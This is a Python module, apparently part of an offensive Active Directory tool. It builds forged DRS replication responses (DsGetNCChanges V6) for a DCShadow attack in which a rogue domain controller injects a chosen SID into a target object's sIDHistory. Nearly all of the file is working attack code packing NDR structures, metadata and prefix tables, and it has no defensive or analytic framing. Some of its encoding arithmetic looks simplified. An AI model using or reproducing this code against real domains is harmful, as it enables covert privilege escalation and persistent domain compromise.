"""
DCShadow replication data builder.

Constructs DRS_MSG_GETCHGREPLY_V6 responses with crafted sIDHistory
attributes for AD replication injection.
"""

import struct
from datetime import datetime, timezone

# sIDHistory attribute OID: 1.2.840.113556.1.4.609
# Prefix 1.2.840.113556.1.4 = prefix index 9 in standard AD prefix table
# attrTyp = (9 << 16) | 609 = 0x00090261
ATTRTYP_SID_HISTORY = 0x00090261
ATTRTYP_OBJECT_CLASS = 0x00000000  # Not needed for partial replication

# Well-known AD OID prefixes (subset needed for replication)
AD_PREFIX_TABLE = [
    # (index, binary_oid_prefix)
    (0, bytes.fromhex('5504')),                          # 2.5.4
    (1, bytes.fromhex('5506')),                          # 2.5.6
    (2, bytes.fromhex('2A864886F7140102')),               # 1.2.840.113556.1.2
    (3, bytes.fromhex('2A864886F7140103')),               # 1.2.840.113556.1.3
    (4, bytes.fromhex('6086480165020201')),               # 2.16.840.1.101.2.2.1
    (5, bytes.fromhex('6086480165020203')),               # 2.16.840.1.101.2.2.3
    (6, bytes.fromhex('6086480165020105')),               # 2.16.840.1.101.2.1.5
    (7, bytes.fromhex('6086480165020104')),               # 2.16.840.1.101.2.1.4
    (8, bytes.fromhex('5505')),                          # 2.5.5
    (9, bytes.fromhex('2A864886F7140104')),               # 1.2.840.113556.1.4
    (10, bytes.fromhex('2A864886F7140105')),              # 1.2.840.113556.1.5
    (19, bytes.fromhex('0992268993F22C6401')),            # 0.9.2342.19200300.100.1
    (20, bytes.fromhex('6086480186F84203')),              # 2.16.840.1.113730.3
]

# Windows FILETIME epoch: Jan 1, 1601
FILETIME_EPOCH = datetime(1601, 1, 1, tzinfo=timezone.utc)


class ReplicationBuilder:
    """
    Build a DRS_MSG_GETCHGREPLY_V6 response for sIDHistory injection.

    Uses impacket's NDR structures to build the wire-format response.
    """

    @staticmethod
    def build_getncchanges_response(
        target_dn: str,
        target_guid: bytes,
        target_sid: bytes,
        sid_to_inject: bytes,
        rogue_dc_guid: bytes,
        rogue_invocation_id: bytes,
        domain_dn: str,
        highest_usn: int,
    ) -> bytes:
        """
        Build a complete DsGetNCChanges V6 response with sIDHistory.

        Args:
            target_dn: DN of the target object
            target_guid: objectGUID of target (16 bytes)
            target_sid: objectSid of target (binary)
            sid_to_inject: SID to inject into sIDHistory (binary)
            rogue_dc_guid: Our rogue DC's objectGUID
            rogue_invocation_id: Our rogue DC's invocationId
            domain_dn: Domain NC DN
            highest_usn: Current highestCommittedUSN from the legit DC
        """
        # Build DSNAME for target
        target_dsname = ReplicationBuilder._build_dsname(
            target_dn, target_guid, target_sid
        )

        # Build ATTR for sIDHistory
        sid_attr = ReplicationBuilder._build_sid_history_attr(sid_to_inject)

        # Build ATTRBLOCK
        attr_block = struct.pack('<I', 1)  # cAttr = 1
        attr_block += sid_attr

        # Build ENTINF
        # pName (pointer to DSNAME) + ulFlags(4) + AttrBlock
        entinf = struct.pack('<I', 1)  # pName referent
        entinf += struct.pack('<I', 0)  # ulFlags
        entinf += attr_block

        # Build PROPERTY_META_DATA_EXT for sIDHistory
        now_filetime = ReplicationBuilder._datetime_to_filetime(
            datetime.now(timezone.utc)
        )
        meta = struct.pack('<I', ATTRTYP_SID_HISTORY)  # attrType
        meta += struct.pack('<I', 1)  # dwVersion
        meta += struct.pack('<Q', now_filetime)  # timeChanged
        meta += rogue_dc_guid  # uuidDsaOriginating (16 bytes)
        meta += struct.pack('<Q', highest_usn + 1)  # usnOriginating

        meta_vector = struct.pack('<I', 1)  # cNumProps
        meta_vector += meta

        # Build REPLENTINFLIST
        repl_entry = struct.pack('<I', 0)  # pNextEntInf = NULL
        repl_entry += entinf
        repl_entry += struct.pack('<I', 0)  # fIsNCPrefix = FALSE
        repl_entry += struct.pack('<I', 0)  # pParentGuid = NULL
        repl_entry += struct.pack('<I', 1)  # pMetaDataExt (referent)
        repl_entry += meta_vector

        # Add DSNAME data (deferred pointer)
        repl_entry += target_dsname

        # Build SCHEMA_PREFIX_TABLE
        prefix_table = ReplicationBuilder._build_prefix_table()

        # Build UPTODATE_CURSOR for our rogue DC
        cursor = rogue_invocation_id  # uuidDsa (16)
        cursor += struct.pack('<Q', highest_usn + 1)  # usnHighPropUpdate
        cursor += struct.pack('<Q', now_filetime)  # timeLastSyncSuccess

        uptodate_vector = struct.pack('<II', 2, 1)  # dwVersion=2, cNumCursors=1
        uptodate_vector += cursor

        # Build the V6 response
        # This is a simplified NDR-encoded response
        resp = rogue_dc_guid  # uuidDsaObjSrc (16)
        resp += rogue_invocation_id  # uuidInvocIdSrc (16)

        # pNC (pointer to DSNAME for domain NC)
        nc_dsname = ReplicationBuilder._build_dsname(domain_dn, b'\x00' * 16, b'')
        resp += struct.pack('<I', 1)  # pNC referent

        # usnvecFrom
        resp += struct.pack('<QQ', 0, 0)  # usnHighObjUpdate=0, usnHighPropUpdate=0

        # usnvecTo
        resp += struct.pack('<QQ', highest_usn + 1, highest_usn + 1)

        # pUpToDateVecSrc (pointer)
        resp += struct.pack('<I', 1)  # referent
        resp += uptodate_vector

        # PrefixTableSrc
        resp += prefix_table

        # ulExtendedRet
        resp += struct.pack('<I', 0)

        # cNumObjects
        resp += struct.pack('<I', 1)

        # cNumBytes
        resp += struct.pack('<I', len(repl_entry))

        # pObjects (pointer)
        resp += struct.pack('<I', 1)  # referent
        resp += repl_entry

        # fMoreData
        resp += struct.pack('<I', 0)  # FALSE

        # cNumNcSizeObjects, cNumNcSizeValues, cNumValues
        resp += struct.pack('<III', 0, 0, 0)

        # rgValues (NULL pointer)
        resp += struct.pack('<I', 0)

        # dwDRSError
        resp += struct.pack('<I', 0)

        # Deferred pointer data: NC DSNAME
        resp += nc_dsname

        # Output version
        output = struct.pack('<I', 6)  # pdwOutVersion = 6
        output += resp

        return output

    @staticmethod
    def _build_dsname(dn: str, guid: bytes, sid: bytes) -> bytes:
        """Build a DSNAME structure."""
        dn_encoded = dn.encode('utf-16-le') + b'\x00\x00'
        sid_len = len(sid)

        # structLen(4) + SidLen(4) + Guid(16) + Sid(28 max) + StringName
        struct_len = 4 + 4 + 16 + 28 + len(dn_encoded)
        # Pad to 4-byte alignment
        struct_len = (struct_len + 3) & ~3

        data = struct.pack('<I', struct_len)
        data += struct.pack('<I', sid_len)
        data += guid if len(guid) == 16 else guid.ljust(16, b'\x00')

        # SID field (fixed 28 bytes)
        sid_field = sid + b'\x00' * (28 - len(sid))
        data += sid_field

        # DN string (UTF-16LE, null terminated)
        data += dn_encoded

        # Pad
        pad_needed = struct_len - len(data) + 4 + 4  # account for structLen and SidLen fields
        if pad_needed > 0:
            data += b'\x00' * pad_needed

        return data

    @staticmethod
    def _build_sid_history_attr(sid_bytes: bytes) -> bytes:
        """Build an ATTR structure for sIDHistory."""
        # ATTR: attrTyp(4) + AttrVal.valCount(4) + AttrVal.pAVal(pointer)
        # ATTRVAL: valLen(4) + pVal(pointer)
        attr = struct.pack('<I', ATTRTYP_SID_HISTORY)
        attr += struct.pack('<I', 1)  # valCount
        attr += struct.pack('<I', 1)  # pAVal referent

        # NDR array: maxCount(4) + offset(4) + actualCount(4)
        attr += struct.pack('<III', 1, 0, 1)

        # ATTRVAL: valLen + pVal
        attr += struct.pack('<I', len(sid_bytes))
        attr += struct.pack('<I', 1)  # pVal referent

        # Value data: maxCount + offset + actualCount + data
        attr += struct.pack('<III', len(sid_bytes), 0, len(sid_bytes))
        attr += sid_bytes

        # Pad to 4-byte alignment
        pad = (4 - (len(sid_bytes) % 4)) % 4
        attr += b'\x00' * pad

        return attr

    @staticmethod
    def _build_prefix_table() -> bytes:
        """Build a SCHEMA_PREFIX_TABLE with the entries we need."""
        entries = []
        for idx, oid_binary in AD_PREFIX_TABLE:
            # PrefixTableEntry: ndx(4) + prefix.length(4) + prefix.elements(pointer)
            entry = struct.pack('<I', idx)
            entry += struct.pack('<I', len(oid_binary))
            entry += struct.pack('<I', 1)  # elements referent
            entries.append((entry, oid_binary))

        # Table: PrefixCount(4) + pPrefixEntry(pointer)
        table = struct.pack('<I', len(entries))
        table += struct.pack('<I', 1)  # pPrefixEntry referent

        # NDR array: maxCount
        table += struct.pack('<I', len(entries))

        # Entry headers
        for entry, _ in entries:
            table += entry

        # Deferred pointer data (OID binary blobs)
        for _, oid_binary in entries:
            table += struct.pack('<III', len(oid_binary), 0, len(oid_binary))
            table += oid_binary
            # Pad
            pad = (4 - (len(oid_binary) % 4)) % 4
            table += b'\x00' * pad

        return table

    @staticmethod
    def _datetime_to_filetime(dt: datetime) -> int:
        """Convert datetime to Windows FILETIME (100-ns intervals since 1601-01-01)."""
        delta = dt - FILETIME_EPOCH
        return int(delta.total_seconds() * 10_000_000)
